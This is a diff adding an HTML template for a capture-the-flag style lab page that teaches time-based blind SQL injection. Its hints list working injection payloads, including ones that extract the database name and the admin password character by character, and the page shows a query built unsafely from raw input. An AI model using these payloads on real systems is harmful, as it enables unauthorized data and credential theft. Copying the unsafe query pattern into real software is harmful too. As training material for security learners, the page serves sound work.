@@ -1,0 +1,109 @@
+{% extends "base.html" %}
+
+{% block title %}Network Diagnostics — CySec SQLi Lab{% endblock %}
+
+{% block content %}
+<div class="page-header">
+  <h1>&#128225; Network Diagnostics</h1>
+  <p class="subtitle">Time-Based Blind SQL Injection — Extract data using response timing as your only oracle.</p>
+</div>
+
+<!-- Diagnostic Form -->
+<div class="form-container">
+  <form method="POST" action="/ping" class="form">
+    <h2 class="form-title">&#127760; Target Diagnostic</h2>
+
+    <div class="form-group">
+      <label for="target_id" class="form-label">Target ID</label>
+      <input
+        type="text"
+        id="target_id"
+        name="target_id"
+        class="form-input"
+        placeholder="Enter target ID (e.g. 1) or SQL payload..."
+        value="{{ target_id if target_id else '' }}"
+        autocomplete="off"
+      >
+    </div>
+
+    <button type="submit" class="button button-primary button-full">Run Diagnostic</button>
+  </form>
+</div>
+
+<!-- Response Display -->
+{% if response_text is defined %}
+<div class="section-block">
+  <h2>&#128202; Diagnostic Response</h2>
+  <div class="card">
+    <div class="card-body">
+      <div class="detail-grid">
+        <div class="detail-item">
+          <span class="detail-label">Target ID</span>
+          <span class="detail-value mono">{{ target_id if target_id else 'N/A' }}</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-label">Response</span>
+          <span class="detail-value">{{ response_text if response_text else 'No response received.' }}</span>
+        </div>
+        {% if response_time is defined %}
+        <div class="detail-item">
+          <span class="detail-label">Response Time</span>
+          <span class="detail-value mono">
+            {% if response_time >= 3 %}
+              <span class="badge badge-red">{{ "%.3f"|format(response_time) }}s</span>
+              <span class="slow-indicator">&#9200; Delayed response detected!</span>
+            {% else %}
+              {{ "%.3f"|format(response_time) }}s
+            {% endif %}
+          </span>
+        </div>
+        {% endif %}
+      </div>
+    </div>
+  </div>
+</div>
+{% endif %}
+
+<!-- Hint Box -->
+<div class="hint-box">
+  <h3>&#128161; Challenge Hints</h3>
+
+  <p>{{ hint if hint else "Pay close attention to how long each request takes. A deliberate delay indicates your injected condition evaluated to TRUE." }}</p>
+
+  <h4>Query Structure</h4>
+  <p>The backend constructs this query:</p>
+  <pre class="code-block"><code>SELECT response_text FROM diagnostics 
+WHERE target_id = {{ target_id if target_id else '[your_input]' }}</code></pre>
+
+  <h4>Time-Based Injection Techniques</h4>
+  <ul>
+    <li><strong>Test for injection:</strong>
+      <pre class="code-block"><code>1; SELECT SLEEP(5)--</code></pre>
+      If the response takes ~5 seconds, you can inject time-based payloads.
+    </li>
+    <li><strong>Conditional delay:</strong>
+      <pre class="code-block"><code>1 AND IF(SUBSTRING(DATABASE(),1,1)='s', SLEEP(5), 0)--</code></pre>
+      If the database name starts with 's', you'll see a 5-second delay.
+    </li>
+    <li><strong>Extract the database name character by character:</strong>
+      <pre class="code-block"><code>1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>100, SLEEP(3), 0)--
+1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>110, SLEEP(3), 0)--
+1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>115, SLEEP(3), 0)--</code></pre>
+      Use binary search to find each character's ASCII value efficiently.
+    </li>
+    <li><strong>Extract from a specific table:</strong>
+      <pre class="code-block"><code>1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--</code></pre>
+    </li>
+  </ul>
+
+  <div class="warning-box" style="margin-top: 1rem;">
+    <p>
+      <strong>Patience required!</strong> Time-based injection is slow — each character requires multiple requests. 
+      Consider using <code class="inline-code">sqlmap --technique=T</code> for automation.
+    </p>
+  </div>
+
+  <p class="hint-meta">Difficulty: <span class="badge badge-red">Hard</span> &nbsp; Points: 300</p>
+</div>
+
+{% endblock %}
